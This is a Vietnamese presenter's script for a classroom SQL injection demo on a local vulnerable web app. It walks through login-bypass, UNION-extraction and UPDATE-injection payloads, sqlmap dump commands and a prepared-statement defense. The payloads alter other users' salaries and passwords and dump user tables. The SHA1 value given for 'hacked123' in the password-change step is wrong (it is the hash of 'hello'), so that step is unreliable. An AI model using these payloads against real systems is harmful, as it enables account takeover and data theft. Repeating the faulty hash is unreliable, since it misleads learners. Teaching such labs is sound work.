# Trình Tự Demo SQL Injection - Hướng Dẫn Chi Tiết

## Chuẩn bị trước khi demo

1. **Khởi động môi trường:**
   ```bash
   start.bat
   ```
   Hoặc:
   ```bash
   docker-compose up -d
   ```

2. **Kiểm tra ứng dụng đã sẵn sàng:**
   - Mở trình duyệt: http://localhost:8080
   - Đảm bảo trang web load được

3. **Chuẩn bị terminal (nếu demo sqlmap):**
   - Cài đặt sqlmap (nếu chưa có)
   - Mở terminal sẵn sàng

---

## PHẦN 1: DEMO SQL INJECTION TRÊN SELECT STATEMENT

### Demo 1.1: Login Bypass - Tấn công thủ công

**Mục tiêu:** Bypass đăng nhập mà không cần biết mật khẩu

**Bước 1: Đăng nhập bình thường**
- Truy cập: http://localhost:8080/index.php
- Nhập:
  - Username: `admin`
  - Password: `admin123`
- Click Login
- **Giải thích:** Đây là cách đăng nhập bình thường, ứng dụng hoạt động đúng

**Bước 2: SQL Injection với Comment (#)**
- Xóa form, nhập:
  - Username: `admin' #`
  - Password: (để trống hoặc nhập bất kỳ)
- Click Login
- **Quan sát:** 
  - Câu SQL được hiển thị: `SELECT * FROM users WHERE username='admin' #' AND password=''`
  - Đăng nhập thành công!
- **Giải thích:** Dấu `#` comment phần password check, chỉ cần username đúng

**Bước 3: SQL Injection với OR condition**
- Xóa form, nhập:
  - Username: `' OR '1'='1`
  - Password: `' OR '1'='1`
- Click Login
- **Quan sát:**
  - Câu SQL: `SELECT * FROM users WHERE username='' OR '1'='1' AND password='' OR '1'='1'`
  - Đăng nhập thành công với user đầu tiên
- **Giải thích:** Điều kiện `'1'='1'` luôn đúng, bypass cả username và password

**Bước 4: SQL Injection với Comment (--)**
- Xóa form, nhập:
  - Username: `admin' -- ` (lưu ý: có khoảng trắng sau --)
  - Password: (để trống)
- Click Login
- **Quan sát:** Đăng nhập thành công
- **Giải thích:** `--` với khoảng trắng cũng comment phần sau

---

### Demo 1.2: Search Injection - Khai thác dữ liệu

**Mục tiêu:** Đọc dữ liệu từ database mà không có quyền

**Bước 1: Tìm kiếm bình thường**
- Truy cập: http://localhost:8080/search.php
- Nhập keyword: `Laptop`
- Click Search
- **Quan sát:** Chỉ hiển thị sản phẩm có tên chứa "Laptop"

**Bước 2: SQL Injection - Hiển thị tất cả sản phẩm**
- Xóa keyword, nhập: `' OR '1'='1`
- Click Search
- **Quan sát:**
  - Câu SQL: `SELECT * FROM products WHERE name LIKE '%' OR '1'='1'%'`
  - Hiển thị TẤT CẢ sản phẩm (4 sản phẩm)
- **Giải thích:** Điều kiện `'1'='1'` luôn đúng, bỏ qua điều kiện LIKE

**Bước 3: UNION-based Injection - Lấy tên database**
- Xóa keyword, nhập: `' UNION SELECT 1, database(), 3, 4 #`
- Click Search
- **Quan sát:**
  - Câu SQL: `SELECT * FROM products WHERE name LIKE '%' UNION SELECT 1, database(), 3, 4 #%'`
  - Hiển thị tên database: `sqli_demo`
- **Giải thích:** UNION kết hợp kết quả, hàm `database()` trả về tên database hiện tại

**Bước 4: UNION-based Injection - Lấy thông tin users**
- Xóa keyword, nhập: `' UNION SELECT id, username, email, role FROM users #`
- Click Search
- **Quan sát:** Hiển thị danh sách users từ bảng users
- **Giải thích:** UNION cho phép đọc dữ liệu từ bảng khác

---

### Demo 1.3: SQL Injection với sqlmap (Tùy chọn)

**Mục tiêu:** Sử dụng công cụ tự động để khai thác

**Bước 1: Phát hiện lỗ hổng**
- Mở terminal
- Chạy lệnh:
  ```bash
  sqlmap -u "http://localhost:8080/search.php?keyword=test" --batch
  ```
- **Quan sát:** sqlmap tự động phát hiện lỗ hổng SQL Injection

**Bước 2: Liệt kê databases**
- Chạy lệnh:
  ```bash
  sqlmap -u "http://localhost:8080/search.php?keyword=test" --dbs --batch
  ```
- **Quan sát:** Hiển thị danh sách databases, bao gồm `sqli_demo`

**Bước 3: Dump dữ liệu users**
- Chạy lệnh:
  ```bash
  sqlmap -u "http://localhost:8080/search.php?keyword=test" -D sqli_demo -T users --dump --batch
  ```
- **Quan sát:** sqlmap tự động dump toàn bộ dữ liệu từ bảng users
- **Giải thích:** Chỉ với vài lệnh, sqlmap đã có thể đánh cắp toàn bộ dữ liệu

---

## PHẦN 2: DEMO SQL INJECTION TRÊN UPDATE STATEMENT

### Demo 2.1: Modify Your Own Salary

**Mục tiêu:** Tăng lương của chính mình bằng SQL Injection

**Bước 1: Đăng nhập**
- Truy cập: http://localhost:8080/index.php
- Đăng nhập với: `alice` / `seedalice`
- Hoặc dùng SQL Injection: Username: `alice' #`, Password: (để trống)

**Bước 2: Vào trang Edit Profile**
- Click vào menu "Edit Profile" hoặc truy cập: http://localhost:8080/profile.php
- **Quan sát:** 
  - Current User: alice
  - Current Salary: $5000.00 (Read-only)
  - Form cho phép chỉnh sửa: nickname, email, address, phone, password

**Bước 3: SQL Injection để tăng lương**
- Trong trường **Nickname**, xóa giá trị hiện tại
- Nhập: `', salary=99999.00 WHERE username='alice`
- Click "Update Profile"
- **Quan sát:**
  - Câu SQL: `UPDATE users SET nickname='', salary=99999.00 WHERE username='alice', email='...', address='...', phone='...' WHERE username='alice'`
  - Profile updated successfully!
- **Giải thích:** Payload chèn thêm điều kiện UPDATE salary vào câu SQL

**Bước 4: Xác nhận lương đã thay đổi**
- Refresh trang hoặc đăng nhập lại
- **Quan sát:** Salary của alice đã tăng lên $99999.00

---

### Demo 2.2: Modify Other People's Salary

**Mục tiêu:** Giảm lương của người khác (Boby)

**Bước 1: Vào Edit Profile**
- Vẫn đăng nhập với alice
- Vào trang Edit Profile

**Bước 2: SQL Injection để giảm lương Boby**
- Trong trường **Nickname**, nhập: `', salary=1.00 WHERE username='boby' -- `
- Click "Update Profile"
- **Quan sát:**
  - Câu SQL: `UPDATE users SET nickname='', salary=1.00 WHERE username='boby' -- ', email='...' ...`
  - Dấu `--` comment phần sau, chỉ thực thi phần UPDATE salary của Boby
  - Profile updated successfully!

**Bước 3: Xác nhận**
- Đăng nhập với: `boby` / `seedboby`
- Vào Edit Profile
- **Quan sát:** Salary của Boby đã bị giảm xuống $1.00

---

### Demo 2.3: Modify Other People's Password

**Mục tiêu:** Đổi mật khẩu của người khác để đăng nhập vào tài khoản của họ

**Bước 1: Tính toán password hash**
- Password mới: `hacked123`
- SHA1 hash của "hacked123": `aaf4c61ddcc5e8a2dabede0f3b482cd9aea9434d`
- (Có thể dùng online SHA1 calculator hoặc PHP: `echo sha1('hacked123');`)

**Bước 2: SQL Injection để đổi password**
- Vẫn đăng nhập với alice
- Vào Edit Profile
- Trong trường **Nickname**, nhập: `', password='aaf4c61ddcc5e8a2dabede0f3b482cd9aea9434d' WHERE username='boby' -- `
- Click "Update Profile"
- **Quan sát:**
  - Câu SQL: `UPDATE users SET nickname='', password='aaf4c61ddcc5e8a2dabede0f3b482cd9aea9434d' WHERE username='boby' -- ', email='...' ...`
  - Profile updated successfully!

**Bước 3: Đăng nhập với password mới**
- Đăng xuất
- Đăng nhập với: `boby` / `hacked123`
- **Quan sát:** Đăng nhập thành công!
- **Giải thích:** Password của Boby đã bị đổi, giờ có thể đăng nhập vào tài khoản của họ

---

## PHẦN 3: DEMO DEFENSE - PREPARED STATEMENT

### Demo 3.1: So sánh Vulnerable vs Secure

**Mục tiêu:** Chứng minh Prepared Statement ngăn chặn SQL Injection

**Bước 1: Thử SQL Injection trên trang Vulnerable**
- Truy cập: http://localhost:8080/index.php
- Nhập: Username: `admin' #`, Password: (để trống)
- **Quan sát:** Đăng nhập thành công (SQL Injection hoạt động)

**Bước 2: Thử cùng payload trên trang Secure**
- Truy cập: http://localhost:8080/defense.php
- Nhập: Username: `admin' #`, Password: (để trống)
- **Quan sát:**
  - Câu SQL hiển thị: `SELECT * FROM users WHERE username=? AND password=?`
  - Parameters: `username='admin' #'`, `password=''`
  - Login failed! (SQL Injection không hoạt động)
- **Giải thích:** 
  - Prepared Statement tách biệt code và data
  - Payload `' #` được treat như data, không phải SQL code
  - Hệ thống tìm user có username chính xác là `admin' #`, không tìm thấy

**Bước 3: Thử các payload khác**
- Username: `' OR '1'='1`, Password: `' OR '1'='1`
- **Quan sát:** Vẫn không hoạt động
- **Giải thích:** Tất cả payload SQL Injection đều không hoạt động với Prepared Statement

**Bước 4: Đăng nhập bình thường**
- Username: `admin`, Password: `admin123`
- **Quan sát:** Đăng nhập thành công
- **Giải thích:** Prepared Statement vẫn hoạt động bình thường với input hợp lệ

---

## PHẦN 4: TỔNG KẾT VÀ GIẢI THÍCH

### Tóm tắt các kỹ thuật đã demo:

1. **SELECT Injection:**
   - Comment-based (`#`, `--`)
   - OR-based (`' OR '1'='1`)
   - UNION-based (đọc dữ liệu từ bảng khác)

2. **UPDATE Injection:**
   - Modify own data (salary)
   - Modify other people's data (salary, password)
   - Sử dụng comment để bypass điều kiện WHERE

3. **Defense:**
   - Prepared Statement ngăn chặn tất cả các kỹ thuật trên

### Điểm quan trọng cần nhấn mạnh:

1. **Nguyên nhân:** String concatenation trực tiếp trong SQL
2. **Hậu quả:** 
   - Bypass authentication
   - Data disclosure
   - Data manipulation
   - Unauthorized access
3. **Giải pháp:** Prepared Statement là cách phòng chống hiệu quả nhất

---

## Thời gian ước tính cho từng phần:

- **Phần 1.1 (Login Bypass):** 3-4 phút
- **Phần 1.2 (Search Injection):** 3-4 phút
- **Phần 1.3 (sqlmap):** 2-3 phút (tùy chọn)
- **Phần 2.1 (Modify Own Salary):** 2-3 phút
- **Phần 2.2 (Modify Other Salary):** 2-3 phút
- **Phần 2.3 (Modify Password):** 2-3 phút
- **Phần 3 (Defense):** 3-4 phút
- **Tổng cộng:** Khoảng 20-25 phút (không tính sqlmap)

---

## Lưu ý khi demo:

1. **Chuẩn bị trước:**
   - Test tất cả các payload trước khi thuyết trình
   - Chuẩn bị screenshot backup nếu cần
   - Đảm bảo database đã reset về trạng thái ban đầu

2. **Khi trình bày:**
   - Giải thích từng bước rõ ràng
   - Chỉ vào câu SQL được hiển thị
   - Nhấn mạnh tại sao payload hoạt động
   - So sánh giữa vulnerable và secure code

3. **Xử lý sự cố:**
   - Nếu có lỗi SQL, giải thích đó là error-based SQL injection
   - Nếu demo không hoạt động, có thể giải thích bằng code
   - Có thể skip phần sqlmap nếu thiếu thời gian

4. **Reset database giữa các demo:**
   - Nếu cần reset về trạng thái ban đầu:
     ```bash
     reset.bat
     ```
   - Hoặc:
     ```bash
     docker-compose down -v
     docker-compose up -d
     ```

---

## Checklist trước khi demo:

- [ ] Docker containers đã chạy
- [ ] Ứng dụng web truy cập được (http://localhost:8080)
- [ ] Đã test tất cả các payload
- [ ] Đã chuẩn bị terminal (nếu demo sqlmap)
- [ ] Đã reset database về trạng thái ban đầu
- [ ] Đã chuẩn bị giải thích cho từng phần
- [ ] Đã có screenshot backup (nếu cần)

